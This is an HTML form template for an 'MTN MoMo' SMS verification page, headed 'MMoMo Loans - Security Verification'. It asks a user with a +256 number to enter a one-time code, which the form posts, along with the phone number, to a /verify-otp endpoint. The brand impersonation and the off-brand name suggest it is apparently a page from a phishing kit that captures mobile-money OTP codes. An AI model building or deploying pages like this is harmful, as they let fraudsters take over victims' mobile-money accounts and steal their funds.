<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Verify OTP - MTN MoMo</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #f4f5f7; font-family: sans-serif; }
        .navbar-custom { background-color: #003366; }
        .card-box { background: white; border-radius: 12px; padding: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
        .btn-momo { background-color: #003366; color: white; font-weight: bold; }
    </style>
</head>
<body>
    <nav class="navbar navbar-custom py-3 px-4">
        <h5 class="text-warning m-0">MMoMo Loans - Security Verification</h5>
    </nav>

    <div class="container d-flex justify-content-center align-items-center" style="min-height: 80vh;">
        <div class="card-box" style="width: 450px;">
            <h3 class="text-center fw-bold">Enter SMS Code</h3>
            <p class="text-center text-muted small">We've sent a verification code to +256 {{ phone }}</p>

            {% if error %}
                <div class="alert alert-danger py-2 text-center small">{{ error }}</div>
            {% endif %}

            <form action="/verify-otp" method="POST">
                <input type="hidden" name="phone" value="{{ phone }}">
                <div class="mb-3 text-center">
                    <input type="text" class="form-control text-center fs-3 tracking-widest" name="otp" placeholder="----" maxlength="6" required autofocus>
                </div>
                <button type="submit" class="btn btn-momo w-100 py-3 rounded-pill mt-3">VERIFY & SUBMIT</button>
            </form>
        </div>
    </div>
</body>
</html>
